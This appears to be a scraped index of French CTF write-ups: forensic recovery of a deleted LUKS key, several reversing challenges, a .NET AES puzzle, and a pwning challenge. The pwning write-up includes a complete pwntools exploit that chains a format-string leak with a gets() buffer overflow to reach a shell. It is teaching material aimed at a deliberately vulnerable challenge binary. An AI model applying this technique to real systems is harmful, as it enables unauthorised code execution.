","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020cryptolocker/:8:0","tags":["forensic","malware","volatility"],"title":"[French FCSC] - Cryptolocker","uri":"maki.bzh/writeups/fcscfrench2020cryptolocker/"},{"categories":["Writeups"],"content":" Vous avez accès à un fichier find_me qui semble renfermer un secret bien gardé, qui n’existe peut-être même plus. Retrouvez son contenu ! ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020findme/:0:0","tags":["anssi","fcsc","luks","forensic","testdisk"],"title":"[French FCSC] - Find Me","uri":"maki.bzh/writeups/fcscfrench2020findme/"},{"categories":["Writeups"],"content":"TL;DR Cette épreuve consiste à analyser une partition EXT4. Dans cette partition, on trouve une autre partition chiffrée (LUKS). La clé de chiffrement de ce volume a été supprimée, mais à l’aide de testdisk, il est possible de la récupérer. Ainsi, déchiffrer le volume, le monter et accéder au flag. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020findme/:1:0","tags":["anssi","fcsc","luks","forensic","testdisk"],"title":"[French FCSC] - Find Me","uri":"maki.bzh/writeups/fcscfrench2020findme/"},{"categories":["Writeups"],"content":"État des lieux On commence cette épreuve avec un volume EXT4, système de fichier classique. Pour ce challenge, il existe au moins deux méthodes pour retrouver la clé du volume chiffré. ➜ file find_me find_me: Linux rev 1.0 ext4 filesystem data, UUID=9c0d2dc5-184c-496a-ba8e-477309e521d9, volume name \"find_me\" (needs journal recovery) (extents) (64bit) (large files) (huge files) ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020findme/:2:0","tags":["anssi","fcsc","luks","forensic","testdisk"],"title":"[French FCSC] - Find Me","uri":"maki.bzh/writeups/fcscfrench2020findme/"},{"categories":["Writeups"],"content":"Solution 1 - Testdisk Le premier réflexe en tant que CTFer est de le passer dans testdisk, d’autant plus que le volume est plutôt léger. ➜ sudo testdisk find_me # Entrer -\u003e None -\u003e Advanced -\u003e List On extrait tous les fichiers et un simple cat de tous les fichiers part** montre une chaine de caractère rigolote: ➜ sudo cat part* TWYtOVkyb01OWm5IWEtzak04cThuUlRUOHgzVWRZ ➜ sudo cat part* | base64 -d Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY Il semblerait que la clé soit: Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020findme/:3:0","tags":["anssi","fcsc","luks","forensic","testdisk"],"title":"[French FCSC] - Find Me","uri":"maki.bzh/writeups/fcscfrench2020findme/"},{"categories":["Writeups"],"content":"Solution 2 - The Sleuth Kit Cette solution n’utilise pas l’outil testdisk, mais la suite The Sleuth Kit (TSK). Cette suite d’outils est très utilisée dans les investigations numériques. Dans les faits, les outils les plus utilisés de cette suite doivent être: mmls : Permets de lister les partitions d’un volume; fls : Liste les fichiers et répertoires d’un volume; istat : Affiche les méta données d’une structure, comme un inode; icat : Affiche le contenu d’un inode. Avec la commande fls il est possible de lister aussi les fichiers supprimés: ➜ mkdir a ➜ fls -a -r -m a find_me 0|a/.|2|d/drwxr-xr-x|0|0|1024|1585770980|1585770852|1585770852|0 0|a/..|2|d/drwxr-xr-x|0|0|1024|1585770980|1585770852|1585770852|0 0|a/lost+found|11|d/drwx------|0|0|12288|1585770852|1585770844|1585770844|0 0|a/lost+found/.|11|d/drwx------|0|0|12288|1585770852|1585770844|1585770844|0 0|a/lost+found/..|2|d/drwxr-xr-x|0|0|1024|1585770980|1585770852|1585770852|0 0|a/unlock_me|12|r/rrw-r--r--|0|0|26214400|1585771103|1585771236|1585771236|0 0|a/pass.b64|13|r/rrw-r--r--|0|0|32|1585770998|1585770852|1585770852|0 0|a/part00 (deleted)|14|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part01 (deleted)|15|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part02 (deleted)|16|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part03 (deleted)|17|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part04 (deleted)|18|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part05 (deleted)|19|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part06 (deleted)|20|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part07 (deleted)|21|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part08 (deleted)|22|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part09 (deleted)|23|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part0a (deleted)|24|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part0b (deleted)|25|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part0c (deleted)|26|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part0d (deleted)|27|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part0e (deleted)|28|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part0f (deleted)|29|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part10 (deleted)|30|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part11 (deleted)|31|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part12 (deleted)|32|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part13 (deleted)|33|r/rr--------|0|0|2|1585770852|1585770852|1585770852|0 0|a/part14 (deleted)|34|r/rr--------|0|0|1|1585770852|1585770852|1585770852|0 0|a/$OrphanFiles|7681|V/V---------|0|0|0|0|0|0|0 0|a/$OrphanFiles/OrphanFile-1921 (deleted)|1921|-/drwxr-xr-x|0|0|0|1585770852|1585770852|1585770852|0 On peut voir qu’il y a plusieurs fichiers supprimés de l’inode 14 à 34. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020findme/:4:0","tags":["anssi","fcsc","luks","forensic","testdisk"],"title":"[French FCSC] - Find Me","uri":"maki.bzh/writeups/fcscfrench2020findme/"},{"categories":["Writeups"],"content":"Récupérer la clé Avec icat, il est possible d’afficher directement le contenu et décoder la clé: ➜ for i in $(seq 14 34); do icat find_me $i; done | base64 -d Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020findme/:4:1","tags":["anssi","fcsc","luks","forensic","testdisk"],"title":"[French FCSC] - Find Me","uri":"maki.bzh/writeups/fcscfrench2020findme/"},{"categories":["Writeups"],"content":"Déchiffrement et montage du volume LUKS L’utilitaire cryptsetup permet de déchiffrer un volume: ➜ mkdir a ➜ sudo cryptsetup luksOpen unlock_me a Saisissez la phrase secrète pour unlock_me : Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY ➜ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop29 7:29 0 25M 0 loop └─a 253:3 0 23M 0 crypt Maintenant que le volume déchiffré a été associé à un mapper, il ne reste qu’à le monter: ➜ sudo mount /dev/mapper/a b ➜ ls -la b total 4 drwxr-xr-x 2 root root 92 avril 1 21:54 . drwxrwxr-x 4 maki maki 4096 avril 24 16:41 .. -r-------- 1 root root 70 avril 1 21:54 .you_found_me Le flag se trouve dans le fichier .you_found_me ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020findme/:5:0","tags":["anssi","fcsc","luks","forensic","testdisk"],"title":"[French FCSC] - Find Me","uri":"maki.bzh/writeups/fcscfrench2020findme/"},{"categories":["Writeups"],"content":"Flag FCSC{750322d61518672328c856ff72fac0a80220835b9864f60451c771ce6f9aeca1} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020findme/:6:0","tags":["anssi","fcsc","luks","forensic","testdisk"],"title":"[French FCSC] - Find Me","uri":"maki.bzh/writeups/fcscfrench2020findme/"},{"categories":["Writeups"],"content":"TL;DR Il existe 3 fonctions: une welcome vulnérable au format string, une AAAAAAAA vulnérable au buffer overflow et une fonction win qui permet de récupérer un bash. Le binaire est protégé par le bit NX, l’ASLR et la PIE. La format string permet de contourner l’ASLR et la PIE. Lorsque les adresses sont recalculées, il suffit d’exploiter le buffer overflow pour attérir dans la fonction “win” et ainsi récupérer le flag. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020pwn/:1:0","tags":["liveoverflow","fcsc","pwn","format string"],"title":"[German FCSC] - Intro to pwning 1","uri":"maki.bzh/writeups/fcscallemand2020pwn/"},{"categories":["Writeups"],"content":"Etat des lieux Ce challenge est le premier d’une suite de 3 challenges d’introduction à l’exploitation de binaire. Le but du premier est de contourner les protections mises en place afin d’exécuter des commandes sur le serveur distant. Le binaire est soumis aux protections suivantes: Les sources du challenges sont données, ce qui est plus simple pour identifier des vulnérabilités. Ci-dessous les 3 fonctions principales du programme: Il est possible d’identifier deux endroits où la fonction “gets()” est utilisée: la fonction welcome() et AAAAAAAA(). La fonction WINgardium_leviosa() quant à elle permet de récupérer l’accès à un bash. La fonction gets() est considérée comme dangereuse, car il est possible de lui passer un buffer en paramètre, mais sans préciser la taille. C’est pourquoi il est très dangereux d’utiliser cette fonction sur une entrée utilisateur. Etant donné que la PIE est activé sur ce binaire, il est impossible de connaitre l’adresse de la fonction win sans leak de mémoire. C’est pour cela que le gets(read_buf); de la fonction welcome() sera utilisé. Lorsque la mémoire sera leaké, le second gets() permettra de jump sur la fonction de win et ainsi récupérer le flag. Ci-dessous un schéma reprenant ce qui a été dit auparavant: ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020pwn/:2:0","tags":["liveoverflow","fcsc","pwn","format string"],"title":"[German FCSC] - Intro to pwning 1","uri":"maki.bzh/writeups/fcscallemand2020pwn/"},{"categories":["Writeups"],"content":"Contournement de la PIE Afin de contourner la PIE, il faut faire fuiter la mémoire grâce à l’utilisation du mécanisme “format string”. Ces “chaines de format” permettent aux développeurs de pouvoir formater leur variable pendant l’affichage. Parmis celles qui vont nous intéresser, il est possible de retrouver: Format string Usage %s / %x Permet de lire une donnée d’un pointeur connu sous forme de chaine de carctère ou hexa %n Permet d’écrire de la donnée à un pointeur connu %p Permet d’afficher les pointeurs sur la stack Les deux premiers types de chaines de format permettent de lire et écrire à un pointeur connu. Or, ce n’est pas le cas ici. C’est pourquoi on va utiliser %p. Pour tout ce qui est exploitation de binaire et gestion des bytes, python2 reste plus simple à utiliser. De plus, la librairie “pwntools” offre plus de possibilité en python2. #!/usr/bin/python2 from pwn import * FORMATSTRING = \"37:%37$p 38:%38$p 39:%39$p 40:%40$p 41:%41$p 42:%42$p 43:%43$p 44:%44$p 45:%45$p 46:%46$p 47:%47$p 48:%48$p 49:%49$p 50:%50$p 51:%51$p 52:%52$p 53:%53$p 54:%54$p 55:%55$p 56:%56$p 57:%57$p 58:%58$p 59:%59$p 60:%60$p 61:%61$p 62:%62$p 63:%63$p 64:%64$p\" p = process('./pwn1') print(p.recvuntil('name:')) p.sendline(FORMATSTRING) leak = p.recvuntil('spell:') print(leak.split(' ')) raw_input(\"gdb attach\") p.interactive() Le gros payload FORMATSTRING est utile pour identifier rapidement quel bloque nous intéresse. Pour le générer, il est possible d’utiliser cette petit boucle bash: for i in $(seq 1 64); do echo \"$i:%$i\\$p\"; done | tr '\\n' ' ' La fonction “raw_input” permet de bloquer l’exécution du programme et laisse le temps à l’attaquant de s’attacher au process. On cherche une adresse de fonction sur la stack, donc ça peut être l’adresse de “main”, “welcome” ou “AAAAAAAA”. Etant donné que la fonction “win” n’est pas appelée, il n’est pas possible de la trouver sur la stack en temps normal. Le plugin “pwndbg” pour gdb est vraiment pratique pour récupérer tout un tas d’information sur le contexte d’exécution d’un binaire. On va lancer une première fois le binaire avec pwntool et s’attacher au process avec gdb: $ sudo gdb -p `pidof pwn1` (pwndbg) \u003e b* main (pwndbg) \u003e vmmap Les adresses en 0x55... sont donc des adresses liées au binaire en exécution. Si on reprend la capture d’écran au dessus, il y en a quelques unes: L’adresse pointée par les flèches est l’adresse de “main”: En comparant avec les sources, il est possible d’identifier qu’il s’agit de la même fonction: Pour récupérer l’adresse de base, il suffit de soutraire la base adresse trouvée dans “vmmap” et l’adresse de main: Maintenant, la PIE est complètement contourné, car il est possible de récupérer l’adresse de base via un leak. En modifiant un peu le script d’exploitation, il est possible de récupérer à tout les coups l’adresse de base: #!/usr/bin/python2 from pwn import * FORMATSTRING = \"|%47$p|\" p = process('./pwn1') print(p.recvuntil('name:')) p.sendline(FORMATSTRING) leak = p.recvuntil('spell:').split('|') base_addr = int(leak[-2], 16)-0x36f log.info(\"Adresse de base: {}\".format(hex(base_addr))) raw_input(\"gdb attach\") p.interactive() Une base address est reconnaissable grâce aux “000” à la fin. Ces zéros sont là, car la base address doit être alignée sur une page mémoire (0x1000). De la même façon, il est possible de calculer l’offset de la fonction win et pouvoir jump dessus plus tard: Il est possible de vérifier que notre offset est correct. On modifie à nouveau notre script pour qu’il affiche l’adresse re calculée et avec gdb il est possible de voir s’il s’agit de la bonne fonction: #!/usr/bin/python2 from pwn import * FORMATSTRING = \"|%47$p|\" p = process('./pwn1') print(p.recvuntil('name:')) p.sendline(FORMATSTRING) leak = p.recvuntil('spell:').split('|') base_addr = int(leak[-2], 16)-0x36f log.info(\"Adresse de base: {}\".format(hex(base_addr))) win_offset = base_addr+0x267 log.info(\"Adresse de la fonction win: {}\".format(hex(win_offset))) raw_input(\"gdb attach\") p.","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020pwn/:3:0","tags":["liveoverflow","fcsc","pwn","format string"],"title":"[German FCSC] - Intro to pwning 1","uri":"maki.bzh/writeups/fcscallemand2020pwn/"},{"categories":["Writeups"],"content":"Exploitation du buffer overflow Maintenant qu’il est possible re calculer l’adresse de la fonction win, il faut pouvoir exploiter le buffer overflow et jump dessus. Pour cela, il faut connaitre le padding de ce buffer et voir lorsqu’il segfault. Pour cela, regardons la fonction “AAAAAAAA” de plus près: Il faut entrer un “secret” afin de pouvoir exploiter la vulnérabilité, sinon le programme se termine. De plus, on sait que le buffer est d’une taille de “0xff”. #!/usr/bin/python2 from pwn import * FORMATSTRING = \"|%47$p|\" p = process('./pwn1') print(p.recvuntil('name:')) p.sendline(FORMATSTRING) leak = p.recvuntil('spell:').split('|') base_addr = int(leak[-2], 16)-0x36f log.info(\"Adresse de base: {}\".format(hex(base_addr))) win_offset = base_addr+0x267 log.info(\"Adresse de la fonction win: {}\".format(hex(win_offset))) raw_input(\"gdb attach\") p.sendline(\"Expelliarmus\\x00\"+cyclic(0xfff)) # \u003c-- PAYLOAD p.interactive() On place notre payload après le “raw_input()” afin de pouvoir s’attacher et process et voir où il crash. L’adresse situé dans le registre RIP contient en réalité une chaine de caractère “cnaacoaa”. Cette chaine est le résultat de la fonction “cyclic”, qui va générer une chaine d’une taille demandée unique permettant de connaitre la taille du buffer avant le crash. Maintenant que l’on connait la taille du buffer, il est possible de contrôler RIP et ainsi pouvoir jump sur la fonction win. #!/usr/bin/python2 from pwn import * FORMATSTRING = \"|%47$p|\" p = process('./pwn1') print(p.recvuntil('name:')) p.sendline(FORMATSTRING) leak = p.recvuntil('spell:').split('|') base_addr = int(leak[-2], 16)-0x36f log.info(\"Adresse de base: {}\".format(hex(base_addr))) win_offset = base_addr+0x267 log.info(\"Adresse de la fonction win: {}\".format(hex(win_offset))) raw_input(\"gdb attach\") PAYLOAD = \"Expelliarmus\\x00\" # \u003c-- Secret PAYLOAD += \"A\"*cyclic_find(\"cnaa\") # \u003c-- PADDING PAYLOAD += p64(win_offset) # \u003c-- Jump vers la fonction win p.sendline(PAYLOAD) p.interactive() Le payload devrait fonctionner, mais le programme segfault quand même: En effet, l’adresse sur RSP doit être alignée, donc se terminer par “0”. En l’occurence, la stack n’est pas aligné, donc il faut ajouter un “ret” sur la stack pour la réaligner. Pour trouver un gadget “ret”, il suffit de le calculer de quelque part: La fonction win est le plus simple étant donné qu’on a son adresse dans notre script d’exploitation. Le script final est donc: #!/usr/bin/python2 from pwn import * HOST = \"hax1.allesctf.net\" PORT = 9100 FORMATSTRING = \"|%47$p|\" p = process('./pwn1') #p = remote(HOST, PORT) print(p.recvuntil('name:')) p.sendline(FORMATSTRING) leak = p.recvuntil('spell:').split('|') base_addr = int(leak[-2], 16)-0x36f log.info(\"Adresse de base: {}\".format(hex(base_addr))) win_offset = base_addr+0x267 log.info(\"Adresse de la fonction win: {}\".format(hex(win_offset))) ret_gadget = win_offset+0x36 raw_input(\"gdb attach\") PAYLOAD = \"Expelliarmus\\x00\" PAYLOAD += \"A\"*cyclic_find(\"cnaa\") PAYLOAD += p64(ret_gadget) PAYLOAD += p64(win_offset) p.sendline(PAYLOAD) p.interactive() ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020pwn/:4:0","tags":["liveoverflow","fcsc","pwn","format string"],"title":"[German FCSC] - Intro to pwning 1","uri":"maki.bzh/writeups/fcscallemand2020pwn/"},{"categories":["Writeups"],"content":"Flag CSCG{NOW_PRACTICE_MORE} ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020pwn/:5:0","tags":["liveoverflow","fcsc","pwn","format string"],"title":"[German FCSC] - Intro to pwning 1","uri":"maki.bzh/writeups/fcscallemand2020pwn/"},{"categories":["Writeups"],"content":"Intro to reversing 1 ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:0:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"TL;DR Le mot de passe est hardcodé dans le code. Un simple “strings” ou une inspection des appels systèmes permet d’avoir le mot de passe permettant d’obtenir le flag. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:1:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Etat des lieux L’épreuve commence avec un binaire Linux (ELF) demandans un mot de passe: ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:2:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Analyse dynamique Un des outils les plus utilisés en analyse dynamique est “ltrace”. Cette commande permet à un analyste de suivre les appels aux libraries au fur et à mesure de l’exécution du binaire. Etant donné que le programme demande un mot de passe, on peut se douter qu’il utilise la fonction “strcmp”: Finalement, les arguments du strcmp sont affichés et permet d’obtenir le flag de validation. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:3:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Flag CSCG{ez_pz_reversing_squ33zy} Intro to reversing 2 ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:4:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"TL;DR Ce challenge de reverse porte sur le reverse d’un césar. C’est à dire que chaque caractère doit être décalé d’un offset de “119”, ce résultat doit être mis au modulo 256 (nombre de caractère total) et finalement le flag apparait. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:5:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Etat des lieux On commence cette épreuve avec un binaire Linux 64 bits. Il n’est pas très gros et ne comporte pas énormément de fonctions. Comme dans le précédent challenge, le traitement doit se faire dans la fonction main. Pour s’en assurer, il est de bon de passer ce binaire dans un désassembleur (ida ftw). Au premier abort on voit une boucle qui fait un “sub” de 0x77: N’étant pas fan de l’assembleur, regardons ce qu’il se passe en pseudo code. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:6:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Cesar Grâce au décompilateur “Hexrays” de IDA, la boucle est bien plus clair et il est possible de voir qu’il s’agit d’un chiffrement de césar avec un décalage de 119 ou 0x77. La chaine à retrouvé se trouve dans la section “.data” sous le doux nom de “s2”. On a le chiffré, on a le décalage, il ne reste qu’à scripter. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:7:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Décodage Pour ça, le python est à mon sens le langage le plus approprié. res = \"\" a = [\"\\xFC\",\"\\xFD\",\"\\xEA\",\"\\xC0\",\"\\xBA\",\"\\xEC\",\"\\xE8\",\"\\xFD\",\"\\xFB\",\"\\xBD\",\"\\xF7\",\"\\xBE\",\"\\xEF\",\"\\xB9\",\"\\xFB\",\"\\xF6\",\"\\xBD\",\"\\xC0\",\"\\xBA\",\"\\xB9\",\"\\xF7\",\"\\xE8\",\"\\xF2\",\"\\xFD\",\"\\xE8\",\"\\xF2\",\"\\xFC\"] for i in a: res += chr((ord(i)+119)%256) print(res) La liste “a” est parcouru et chaque caractère est converti en décimal. Ensuite l’opération inverse de celle présente dans le binaire est effectuée (on additionne au lieu de soustraire). Finalement, un modulo 256 est appliqué à ces nombres, car il existe 256 symboles dans la table ascii. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:8:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Flag CSCG{sta71c_tr4n5f0rm4710n_it_is} Intro to reversing 3 ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:9:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"TL;DR Comme les deux premiers, il s’agit d’une petite routine “crypto”. En l’occurence un xor suivi d’un décalage. Même logique que précédemment, comprendre la routine, implémenter l’inverse et récupérer le flag. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:10:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Etat des lieux Encore une fois le binaire est très petit et ne contient pas beaucoup de fonctions. Le traitement se fait dans le main. Avec la vue bloc de IDA, on peut identifier deux opérations: Encore une fois, le décompilateur va nous être utile pour comprendre plus facilement ce qu’il se passe: La chaine chiffré se situé à nouveau dans “.data” sous le nom de “s2”. Comme il y a des caractères imprimable, IDA va en faire une chaine de caractère, pour récupérer tout l’hex comme sur la capture précédente, il suffit d’appuyer sur “u”, permettant à IDA de supprimer les traitements automatiques et revenir à un tableau d’octets brut. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:11:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Déchiffrement du XOR Comme vu précédemment, il y a un xor puis un décalage. Il suffit d’implémenter l’inverse pour récupérer le flag de validation: res = \"\" a = [\"\\x6C\",\"\\x70\",\"\\x60\",\"\\x37\",\"\\x61\",\"\\x3C\",\"\\x71\",\"\\x4C\",\"\\x77\",\"\\x1E\",\"\\x6B\",\"\\x48\",\"\\x6F\",\"\\x70\",\"\\x74\",\"\\x28\",\"\\x66\",\"\\x2D\",\"\\x66\",\"\\x2A\",\"\\x2C\",\"\\x6F\",\"\\x7D\",\"\\x56\",\"\\x0F\",\"\\x15\",\"\\x4A\"] for i in range(len(a)): tmp = ord(a[i])+2 res += chr(tmp^(i+10)) print(res) ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:12:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"Flag CSCG{dyn4m1c_k3y_gen3r4t10n_y34h} ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020introrev/:13:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - Intro to reversing","uri":"maki.bzh/writeups/fcscallemand2020introrev/"},{"categories":["Writeups"],"content":"ReMe 1 ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:0:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"TL;DR Ce challenge est différent des autres, car il s’agit d’un PE en .Net. Avec DnSpy il est possible de récupérer les sources C#. Enfin, il suffit de trouver la routine en AES et la génération de la clé / iv pour enfin déchiffrer le flag. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:1:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Etat des lieux On commence donc avec un PE développé en .Net. L’avantage est qu’il est possible de récupérer les sources avec des outils comme DnSpy ou IlSpy. L’inconvénient est que ces outils ne fonctionnent que sous Windows… Après 45 minutes de mises à jour Windows, nous sommes enfin prêt pour le reverse de ce binaire. la fonction Main contient deux parties intéressantes: L’initialCheck du main permet en réalité de charger le flag chiffré dans le programme. La routine “AES_Decrypt” quant à elle est assez standard. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:2:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Identification de l’AES Aux vues de la fonction “AES_Decrypt”, nous sommes en droit de se dire qu’il s’agit d’AES CBC, car il y a une clé et un IV. L’absence de compteur et la présence d’IV écartent les modes ECB et GCM. La génération des clés est assez intéressantes, en effet il s’agit de la RFC2898, se traduisant par l’algorithme “PBKDF2”, utilisé pour dériver des clés en fonction d’une entrée et d’un sel. https://docs.microsoft.com/fr-fr/dotnet/api/system.security.cryptography.rfc2898derivebytes?view=netframework-4.8 Finalement il est possible de dériver la clé de chiffrement et le vecteur d’initialisation en Python: ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:3:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Déchiffrement Le déchiffrement en python quant à lui se déroule moins bien. En effet, la capture suivante montre que le déchiffrement a bien eu lieu et que la clé et l’IV semblent bon. Le padding de “\\x08” se suit sur l’ensemble du bloc. Le soucis doit venir du codage des caractères entre le C# et Python3. Pour ne pas s’embêter avec des histoires de Little / Big Endian, il suffit d’utiliser un interpréteur C# en ligne ou alors son IDE préféré. Finalement, le déchiffrement se passe mieux et le flag est obtenu: ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:4:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Flag CSCG{CanIHazFlag?} ReMe 2 ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:5:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"TL;DR Lors de cette épreuve, il s’agit d’un PE (binaire windows) compilé en .Net. Comme vu dans le challenge précédent, les binaire .Net sont plus simples à reverse grâce à la décompilation. Ce challenge se base sur le même binaire que la première épreuve. Elle commence avec la compréhension qu’il existe une autre routine de déchiffrement, identifier la partie chiffrée et récupérer la clé. Le bloc chiffré est disponible à la fin du binaire et la clé est l’ensemble des opcodes de la fonction “InitialCheck()”. Un peu de python et de formating C#, le contenu déchiffré donne un second PE .Net à décompiler, mais cette fois pas de reverse lourd à faire, car il s’agit de la concaténation du flag. ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:6:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Etat des lieux On commence cette épreuve avec le même binaire que le “ReMe1”. En fait dans la fonction main, la vraie routine de déchiffrement est appelée. Par ailleurs, il y a une fonction “seek” qui a un peu la même fonction qu’en Python, à savoir récupérer du contenu à un offset donné: En l’occurence le pattern de départ est: “THIS_IS_CSCG_NOT_A_MALWARE!”. Avec un héditeur hexa, il est possible de voir un blob qui semble être chiffré après cette chaine: ","date":"2020-02-05","objectID":"maki.bzh/writeups/fcscallemand2020reme/:7:0","tags":["liveoverflow","fcsc","reverse","static","ida"],"title":"[German FCSC] - ReMe","uri":"maki.bzh/writeups/fcscallemand2020reme/"},{"categories":["Writeups"],"content":"Approche statique L’approche dynamique nécessitant d’installer dotnet, configurer un debugger etc.. L’approche statique a été préférée (flemme army). Donc comme dit 